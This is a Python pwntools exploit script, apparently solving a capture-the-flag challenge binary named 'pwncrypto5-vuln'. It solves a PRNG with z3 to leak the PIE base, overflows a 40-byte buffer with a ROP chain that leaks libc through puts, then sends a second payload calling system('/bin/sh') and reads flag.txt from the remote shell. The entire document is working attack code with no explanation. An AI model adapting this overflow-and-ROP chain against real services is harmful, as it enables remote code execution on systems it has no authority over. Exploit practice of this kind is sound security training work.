#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./pwncrypto5-vuln")

context.binary = exe
pie = 0x1239
libc = 0x84400
system = 0x52290
binsh = 0x1b45bd
rdi = 0x13f3

def solvePRNG(x, y):
    import z3
    a, b = z3.BitVec('a', 32), z3.BitVec('b', 32)
    def next(a, b):
        a = a^(14*a)
        a^=b
        b = 62555385*b+17
        return a, b
    s = z3.Solver()
    s.add(next(a, b)[0]==x)
    s.add(next(next(a, b)[0],next(a, b)[1])[0]==y)
    s.check()
    m = s.model()
    return eval(str(m[a]<<32|m[b]))

def main():
    r = remote(sys.argv[1], int(sys.argv[2]))
    r.sendline(b'2')
    r.readuntil(b'student number is: ')
    line1 = r.readline().strip()
    
    r.sendline(b'2')
    r.readuntil(b'student number is: ')
    
    line2 = r.readline().strip()
    
    x = solvePRNG(int(str(line1)[2:-1],16),int(str(line2)[2:-1],16))-pie
    log.success(str(hex(x)))
    
    exe.address = x
    rop = ROP(exe)
    rop.raw(b'A'*40)
    rop.puts(exe.got['puts'])
    rop.main()

    
    r.sendline(b'3')
    r.sendline(rop.chain())
    sleep(0.2)
    r.sendline(b'4')
    r.readuntil(b'Enter here')
    r.readuntil(b'Enter here:')
    line = r.readline().strip()
    value = "00"+str(binascii.hexlify(line))[2:-1]
    final = "".join(reversed([value[i:i+2] for i in range(0, len(value), 2)]))
    log.success(str(final))
    value = int(str(final),16)-libc
    payload = b'A'*40
    payload += p64(x+rdi+1)
    payload += p64(x+rdi)
    payload += p64(value + binsh)
    payload += p64(value + system)
    r.sendline(b'3')
    r.sendline(payload)
    r.sendline(b'4')
    r.recvuntil(b'attend to it!')
    r.recvuntil(b'here: ')
    r.sendline(b'cat flag.txt')
    print(r.recv(1024))
    #r.interactive()

if __name__ == "__main__":
    main()
